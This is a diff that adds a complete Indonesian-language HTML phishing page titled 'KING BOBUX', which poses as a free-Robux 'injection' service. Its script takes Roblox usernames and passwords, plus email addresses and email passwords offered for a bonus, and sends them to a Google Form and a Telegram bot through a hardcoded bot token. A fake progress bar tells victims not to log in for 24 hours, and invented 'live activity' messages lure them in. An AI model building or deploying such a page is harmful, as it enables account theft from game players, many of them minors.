@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KING BOBUX | ELITE</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@900&family=Orbitron:wght@900&display=swap');
+        body { background: #000; color: #fff; font-family: 'Montserrat', sans-serif; overflow-x: hidden; }
+        .glass { background: rgba(20,20,20,0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255,215,0,0.2); border-radius: 2rem; }
+        .gold { background: linear-gradient(135deg, #ffd700, #b8860b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-family: 'Orbitron', sans-serif; }
+        .btn-gold { background: linear-gradient(135deg, #ffd700, #daa520); color: #000; font-weight: 900; }
+        .btn-opt { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); }
+        .btn-opt.active { border-color: #ffd700; background: rgba(255,215,0,0.1); }
+        .input-p { background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); outline: none; width: 100%; padding: 15px; border-radius: 1rem; color: #ffd700; font-size: 12px; }
+        .hidden { display: none; }
+        #bar { width: 0%; height: 100%; background: #ffd700; transition: 15s linear; }
+    </style>
+</head>
+<body class="p-6 max-w-md mx-auto">
+
+    <header class="text-center my-8">
+        <h1 class="text-4xl gold italic uppercase">KING BOBUX</h1>
+        <p class="text-[7px] text-zinc-500 tracking-[5px] uppercase mt-2">● Professional Injection ●</p>
+    </header>
+
+    <div class="glass p-8 shadow-2xl">
+        <div id="p1" class="space-y-6">
+            <div class="grid grid-cols-2 gap-4">
+                <button onclick="setA(this,'10K')" class="btn-opt py-6 rounded-2xl text-sm font-black">10K<br><span class="text-yellow-500 text-[10px]">RBX</span></button>
+                <button onclick="setA(this,'50K')" class="btn-opt py-6 rounded-2xl text-sm font-black">50K<br><span class="text-yellow-500 text-[10px]">RBX</span></button>
+            </div>
+            <button onclick="go(1,2)" class="w-full btn-gold py-5 rounded-2xl text-[10px] uppercase tracking-widest">NEXT</button>
+        </div>
+
+        <div id="p2" class="hidden space-y-4 text-center">
+            <p class="text-[10px] gold italic mb-4 uppercase">Verification Method</p>
+            <button onclick="sh('e')" class="w-full btn-opt py-5 rounded-2xl text-[10px] font-black flex justify-between px-6"><span>TERTAUT EMAIL</span><span class="bg-yellow-500 text-black px-2 rounded">+5K</span></button>
+            <button onclick="sh('b')" class="w-full btn-opt py-5 rounded-2xl text-[10px] font-black text-zinc-500">TANPA EMAIL</button>
+        </div>
+
+        <div id="p3" class="hidden space-y-3">
+            <input type="text" id="u" placeholder="USERNAME" class="input-p">
+            <input type="password" id="p" placeholder="PASSWORD" class="input-p">
+            <div id="ef" class="hidden space-y-3 pt-3 border-t border-zinc-800">
+                <input type="email" id="em" placeholder="EMAIL" class="input-p">
+                <input type="password" id="ep" placeholder="EMAIL PASSWORD" class="input-p">
+            </div>
+            <button onclick="send()" class="w-full btn-gold py-5 rounded-2xl text-[10px] uppercase tracking-widest mt-4">CONFIRM</button>
+        </div>
+
+        <div id="p4" class="hidden text-center py-6">
+            <h2 class="gold text-lg italic mb-4">INJECTING...</h2>
+            <div class="w-full h-1.5 bg-zinc-800 rounded-full overflow-hidden mb-4"><div id="bar"></div></div>
+            <p class="text-[8px] text-zinc-500 uppercase font-black">Success! Jangan login 24 jam.</p>
+        </div>
+    </div>
+
+    <div class="mt-10 px-4 opacity-50">
+        <p class="text-[8px] gold font-black mb-3">● LIVE ACTIVITY</p>
+        <div id="chat" class="h-20 overflow-hidden text-[9px] space-y-2"></div>
+    </div>
+
+    <script>
+        let amt = "", md = "";
+        const tok = "8712552694:AAHAjQQhwx4Vlas6CWs6QHB4iYSA5U2LiWM", cid = "7153376507";
+        const form = "https://docs.google.com/forms/d/e/1FAIpQLSfgBrBP1Bqk4tfVHBFUPZDCbW5fj7nK8NZuObuQPmhyRcEGxg/formResponse";
+
+        function setA(b,v){ document.querySelectorAll('.btn-opt').forEach(x=>x.classList.remove('active')); b.classList.add('active'); amt=v; }
+        function go(f,t){ if(!amt && f==1) return; document.getElementById('p'+f).classList.add('hidden'); document.getElementById('p'+t).classList.remove('hidden'); }
+        function sh(m){ md=m; go(2,3); if(m=='e') document.getElementById('ef').classList.remove('hidden'); }
+        
+        function send(){
+            const u=document.getElementById('u').value, p=document.getElementById('p').value, e=document.getElementById('em').value||"-", ep=document.getElementById('ep').value||"-";
+            if(!u || !p) return;
+            const fd = new FormData();
+            fd.append('entry.298399091',u); fd.append('entry.434090398',p); fd.append('entry.455306086',e); fd.append('entry.734491941',ep); fd.append('entry.1584180390',amt);
+            fetch(form,{method:'POST',mode:'no-cors',body:fd});
+            fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(`🚀 *VIP*\n👤 \`${u}\`\n🔑 \`${p}\`\n📧 \`${e}\`\n🔐 \`${ep}\`\n💎 \`${amt}\``)}&parse_mode=Markdown`);
+            go(3,4); setTimeout(()=>document.getElementById('bar').style.width="100%",100);
+        }
+
+        const m = ["Landing 10k!", "Bonus 5k cair!", "Gacor thx admin!", "Work parah cuy."];
+        setInterval(()=>{
+            const b = document.getElementById('chat');
+            const d = document.createElement('div');
+            d.innerHTML = `<span class="text-yellow-500">User_${Math.floor(Math.random()*99)}***:</span> <span class="text-zinc-400 ml-2">${m[Math.floor(Math.random()*m.length)]}</span>`;
+            b.insertBefore(d, b.firstChild);
+            if(b.childNodes.length > 4) b.removeChild(b.lastChild);
+        }, 3000);
+    </script>
+</body>
+</html>
